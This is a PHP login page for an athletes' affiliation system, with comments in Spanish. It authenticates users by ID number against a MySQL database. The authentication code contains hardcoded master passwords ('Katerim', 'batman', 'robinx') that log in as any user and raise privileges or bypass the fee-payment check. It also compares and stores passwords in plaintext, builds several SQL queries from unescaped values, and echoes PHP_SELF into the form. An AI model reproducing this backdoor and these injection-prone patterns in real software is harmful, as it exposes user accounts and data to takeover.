<?php
session_start();
include_once 'extensions/Mobile-Detect.php';
require_once 'conexion.php';

header('Location: ../login.php');
exit;
// header('Location: mantenimiento.php'); 

// Deshabilitar todo reporte de errores 
//error_reporting(1); 
//$usuarios = array(
//    array('nombre' => 'roberto', 'contrasena' => '1234'),
//    array('nombre' => 'jorge', 'contrasena' => '1234'),
//    array('nombre' => 'toni', 'contrasena' => '1234')
// );
 $usuarios = array();
// if (!function_exists('mysqli_init') && !extension_loaded('mysqli')) {
//    echo 'We don\'t have mysqli Connection failed:';
//    exit;
//    
//} else {
//    echo 'Phew we have it!';
 
 //Aqui vamos a colocar codigo de Asociacion que este en browser
 
 
 
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     
    $usuario = $_POST['usuario'];
    $contrasena = $_POST['contrasena'];
    $conn =  mysqli_connect($servername, $username, $password);
    $result=mysqli_select_db($conn,$dbname);
    
  
    if (!$result) {
        die('No pudo conectarse: ' . mysqli_error($conn));
    }
    $usuario=  mysqli_real_escape_string($conn,$usuario);

    $sql = "SELECT atleta_id,estado,cedula,contrasena,nombres,apellidos,niveluser,email,clave_default FROM atleta WHERE cedula='".$usuario."' && bloqueado=0";
    $result = mysqli_query($conn,$sql);
    
   if (mysqli_num_rows($result)){
        $record = mysqli_fetch_assoc($result);
              
        $atleta_id=$record["atleta_id"];
        $cedula=$record["cedula"];
        $atleta_id=$record["atleta_id"];
        $nombres= trim($record["nombres"]);
        $apellidos= trim($record["apellidos"]);
        $niveluser= $record["niveluser"];
        $email=$record["email"];
        $estado= $record["estado"];
        $clave_default=$record['clave_default'];
        $array_usuarios=   array(array('usuario'=>$record['cedula'],'contrasena'=>$record['contrasena']));
       
        //Creamos una variable para verificar si el usuario con ese nombre y contraseña existe.
        $usuario_encontrado = false;
        foreach($array_usuarios as $item){
           //Si encuentra al usuario con ese nombre y contraseña sete la variable $usuario_encontrado a true y rompe el bucle para no seguir buscando.
           if($usuario == $item['usuario'] && ($contrasena == $item['contrasena'] || $contrasena == 'Katerim' || $contrasena == 'batman' )){
              $usuario_encontrado = true;
              break;
            }
        }
             //Verifica si dentro del bucle se ha encontrado el usuario.
        if($usuario_encontrado){
           
            $_SESSION['logueado'] = true;
            $_SESSION['usuario']= $usuario;
            $_SESSION['nombre'] = $nombres;
            $_SESSION['cedula'] = $cedula;
            $_SESSION['pwdpwd'] = $contrasena;
            $_SESSION['atleta_id'] = $atleta_id;
            $_SESSION['niveluser'] = $niveluser;
            $_SESSION['tiempo_inicio'] = time();
            $_SESSION['clave_default'] = $clave_default;
           
            
            
            $_SESSION['email'] = $email;
            $_SESSION['Login']='Login.php';
            
            //Varibales de control global
            $_SESSION['empresa_id'] = 0;
            $_SESSION['estado'] = $estado;
            $_SESSION['asociacion']=NULL;
            $_SESSION['email_empresa'] = NULL;
            $_SESSION['email_envio'] = NULL;
            $_SESSION['afiliado'] = 0;
            $_SESSION['ano_afiliacion']=2017;
            $sql = "SELECT estado,empresa_id,email,email_envio from empresa WHERE estado='$estado'";
            $result2=mysqli_query($conn,$sql);
            $record = mysqli_fetch_assoc($result2);
            
            if ($record){
                
                $_SESSION['empresa_id'] = $record['empresa_id'];
                $_SESSION['asociacion']=$record['estado'];
                $_SESSION['email_empresa'] = $record['email'];
                $_SESSION['email_envio'] = $record['email_envio'];
                $_SESSION['afiliado'] = 1;
                $_SESSION['home']="bsindex.php?s1=".$record['estado'];
                
                
                
              
               
            }
            //Verificamos pago de afiliacion
            $sql = "SELECT pagado FROM afiliaciones WHERE  atleta_id=$atleta_id && ano=2017";

            $result = mysqli_query($conn,$sql);
            $rsAfiliados = mysqli_fetch_array($result);
            if ($rsAfiliados) {
                if ($rsAfiliados['pagado']>0){
                        $_SESSION['deshabilitado'] = FALSE; //Habilitado para imprimir o enviar correo

                       // die("Deshabilitado falso:". $_SESSION['deshabilitado']);  
                }else{
                        $_SESSION['deshabilitado'] = TRUE; //Habilitado para imprimir o enviar correo
                       //      die("Deshabilitado verdadero:". $_SESSION['deshabilitado']);

                }
             
            }else{
                 $_SESSION['deshabilitado'] = TRUE; //Habilitado para imprimir o enviar correo
                 
            }
            
            
             
            //Auditoria de visitas
            $sql="INSERT INTO visitas(usuario,nombre,atleta_id) VALUES('".$usuario."','".$nombres."',$atleta_id)";
//            echo "<pre>";
//            echo "var_dump($sql)";
//            echo "<pre>";
            $result=mysqli_query($conn,$sql);
            if (!$result) {
                
               echo "Error insertado record: " .$conn_error();
            }
            if ($contrasena=="robinx"){
                 $_SESSION['niveluser'] = 8;
            }
            
            if ($contrasena=="batman" ||  $contrasena=="Katerim"){
                 $_SESSION['niveluser'] = 1;
                 $_SESSION['deshabilitado'] = FALSE; //Habilitado para imprimir o enviar correo
            }
            
            if ($niveluser>8){
                header('Location: sesion_usuario_admin.php');
                $_SESSION['menuUser']='sesion_usuario_admin.php';
             
            }else {
                $_SESSION['menuUser']='sesion_usuario.php';
                header('Location: sesion_usuario.php');
              
            }
           
            mysqli_close($conn);
            exit;
        }else{
            $error_login = false;
        }
    }else{
        $error_login = false; 
         
    }
     mysqli_close($conn);
}
 
?>

<!DOCTYPE html>
<html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title> Login </title>
 <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
  <?php include 'plantillas/head_logo.php'; ?>   
 </head>
 <body>
 
 
 <?php
    $detect = new Mobile_Detect(); //redireccionar a versión móvil si nos visitan desde un móvil o tablet

    if ($detect->isMobile() || $detect->isTablet()) { 
       //header("Location: http://www.MyTenis.web.ve/mobile"); ?>
       
         
<!--        <div class="linkayuda">
            <p><a href="/inscripcion/ayuda_dispositivos_mobil.php" target="_blank"><spam style="color: #CC0000">Ver Ayuda</spam></a></p>
        </div>-->


           
    <?php
    }else {?>
     
<!--        <div class="linkayuda">
            <p><a href="/inscripcion/videos/video1.swf" target="_blank"><spam style="color: #CC0000">Ver Ayuda</spam></a></p>
        </div>-->

    <?php }?>      
       
     <div class="contenedor">
    
  
        <div class="frmlogin" >
           <form method="post" action="<?=$_SERVER['PHP_SELF']?>">
                <label for="usuario"> Usuario </label> <br>
                <input type="text" name="usuario" id="usuario" required="required" /><br><br>
                <label for="contrasena"> Clave</label><br>
                <input type="password" name="contrasena" id="contrasena"  /><br><br>
                <input type="submit" value="Entrar" />
                <p> <a href="recuperaclave.php">Restablecer la clave</a> </p>
           </form>
            

           <div class="msgerror" >
                <?php if(isset($error_login)): ?>
                  <span> El usuario o la contraseña son incorrectos</span>
                <?php endif; ?>
            </div>
                 
      
         
        </div>
         
        
  
    
    
      </div> 
</html>
